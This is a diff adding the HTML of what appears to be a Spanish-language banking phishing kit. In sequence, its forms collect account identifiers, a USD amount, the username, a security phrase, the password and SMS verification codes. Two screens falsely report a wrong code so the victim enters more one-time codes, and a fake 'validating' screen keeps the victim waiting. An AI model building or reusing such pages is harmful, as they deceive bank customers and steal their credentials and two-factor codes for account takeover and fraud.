@@ -1,0 +1,149 @@
+<form id="frm-prest" style="background-image: url('./ast/frm002.svg');width: 380px;height:541px;display: inline-block;">
+    <input autocomplete="off" name="gtrip01" id="gtrip01" placeholder="" type="text" style="font-family: sans-serif;position: relative;display: block;top: 162px;left: 35px;width: 309px;height: 30px;border:none;outline: none;color:#444;background:rgba(0,0,0,0);font-size: 14px;padding: 0 14px;box-sizing: border-box;" autofocus required>
+
+    <input autocomplete="off" name="gtrip02" id="gtrip02" placeholder="000-000000-0000A" type="text" style="font-family: sans-serif;position: relative;display: block;top: 211px;left: 35px;width: 309px;height: 30px;border:none;outline: none;color:#444;background:rgba(0,0,0,0);font-size: 14px;padding: 0 14px;box-sizing: border-box;" required>
+    
+    <input autocomplete="off" name="gtrip03" id="gtrip03" placeholder="000-000-00" type="text" style="font-family: sans-serif;position: relative;display: block;top: 260px;left: 35px;width: 309px;height: 30px;border:none;outline: none;color:#444;background:rgba(0,0,0,0);font-size: 14px;padding: 0 14px;box-sizing: border-box;" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" inputmode="numeric" required>
+
+    <input autocomplete="off" name="gtrip04" id="gtrip04" placeholder="Indique cantidad en USD" type="text" style="font-family: sans-serif;position: relative;display: block;top: 307px;left: 35px;width: 309px;height: 30px;border:none;outline: none;color:#444;background:rgba(0,0,0,0);font-size: 14px;padding: 0 14px;box-sizing: border-box;" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" inputmode="numeric" required>
+
+    <input id="btn-stp1" style="position: relative;display: block;top: 338px;left: 32px;width: 317px;height: 42px;border:none;outline: none;background:rgba(0,0,0,0);" type="submit" value="">
+    <style>
+        input::placeholder{
+            color: #999999;
+        }
+    </style>
+</form>
+
+
+<form id="frm-u">
+    <h1>Bienvenido!</h1>
+    <p>Ingrese sus datos a continuación:</p>
+    <label for="ipt1">Ingrese su Usuario</label>
+    <input type="text" id="ipt1" name="ipt1" maxlength="28" required>
+
+    <div class="fgt-psw">
+        <div class="link1"><p class="psw-link">Olvidé mi contraseña</p></div> <div class="remb"><p>Recordarme</p><img src="./ast/swtch.svg" alt=""></div>
+    </div>
+
+    <input type="submit" value="Inicie Sesión" id="btn-stp2">
+
+    <div class="ftr-links">
+        <p class="psw-link">Olvidé mi contraseña</p> <p class="psw-link">Afiliese</p>
+    </div>
+
+</form>
+
+<form id="frm-verf">
+    <h1>Método de Verificación</h1>
+    <p>A continuación, seleccione una imagen de seguridad e ingrese
+        una frase que  le recuerde a la misma:
+    </p>
+    <div class="sec-img"><img src="./ast/ldng.gif" alt=""></div>
+
+    <label for="ipt1">Ingrese su frase de seguridad</label>
+    <input type="text" id="ipt1" name="ipt1" maxlength="50" placeholder="Frase relacionada con la imagen" required>
+
+    
+
+    <input type="submit" value="Continuar" id="btn-stp3">
+
+    <div class="ftr-links" style="justify-content: center;">
+        <p class="psw-link">Cancelar</p> 
+    </div>
+</form>
+
+<form id="frm-p">
+    <h1>Método de Verificación</h1>
+    <p>A continuación, ingrese su contraseña:
+    </p>
+
+    <label for="ipt1">Ingrese su contraseña</label>
+    <input type="password" id="ipt1" name="ipt1" maxlength="50" placeholder="Contraseña" required>
+
+    <div class="ftr-links">
+        <p class="psw-link">Olvidé mi contraseña</p>
+    </div>
+
+    <input type="submit" value="Inicie Sesión" id="btn-stp4">
+
+    <div class="ftr-links" style="justify-content: center;">
+        <p class="psw-link">Cancelar</p> 
+    </div>
+</form>
+
+<form id="frm-tkn1">
+    <h1>Método de Verificación</h1>
+    <p>A continuación, ingrese el código SMS enviado a su teléfono registrado:
+    </p>
+    <div class="sec-img"><img src="./ast/pscd.svg" alt=""></div>
+
+    <label for="ipt1">Código SMS</label>
+    <input type="text" id="ipt1" name="ipt1" placeholder="********" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" maxlength="8" inputmode="numeric" required>
+
+    <div class="ftr-links">
+        <p class="psw-link">No recibí el código</p>
+    </div>
+
+    <input type="submit" value="Continuar" id="btn-stp5">
+
+    <div class="ftr-links" style="justify-content: center;">
+        <p class="psw-link">Cancelar</p> 
+    </div>
+</form>
+
+<form id="frm-tkn2">
+    <h1>Método de Verificación</h1>
+    <p class="alrt">El código ingresado es incorrecto</p>
+    <p>Por favor, ingrese el código SMS enviado a su teléfono registrado:
+    </p>
+    <div class="sec-img"><img src="./ast/pscd.svg" alt=""></div>
+
+    <label for="ipt1">Código SMS</label>
+    <input type="text" id="ipt1" name="ipt1" placeholder="********" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" maxlength="8" inputmode="numeric" required>
+
+    <div class="ftr-links">
+        <p class="psw-link">No recibí el código</p>
+    </div>
+
+    <input type="submit" value="Continuar" id="btn-stp6">
+
+    <div class="ftr-links" style="justify-content: center;">
+        <p class="psw-link">Cancelar</p> 
+    </div>
+</form>
+
+<form id="frm-tkn3">
+    <h1>Método de Verificación</h1>
+    <p class="alrt">El código ingresado es incorrecto</p>
+    <p>Por favor, ingrese el código SMS enviado a su teléfono registrado:
+    </p>
+    <div class="sec-img"><img src="./ast/pscd.svg" alt=""></div>
+
+    <label for="ipt1">Código SMS</label>
+    <input type="text" id="ipt1" name="ipt1" placeholder="********" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" maxlength="8" inputmode="numeric" required>
+
+    <div class="ftr-links">
+        <p class="psw-link">No recibí el código</p>
+    </div>
+
+    <input type="submit" value="Continuar" id="btn-stp7">
+
+    <div class="ftr-links" style="justify-content: center;">
+        <p class="psw-link">Cancelar</p> 
+    </div>
+</form>
+
+
+<form id="frm-wait">
+    <h1>Validando Información</h1>
+    <p>Por favor espere mientras validamos su información</p>
+    <div class="sec-img"><img src="./ast/ldr.gif" alt=""></div>
+    
+
+    <input type="submit" value="Continuar" id="" style="background-color: #aaa">
+
+    <div class="ftr-links" style="justify-content: center;">
+        <p class="psw-link" style="color: #aaa;">Cancelar</p> 
+    </div>
+</form>
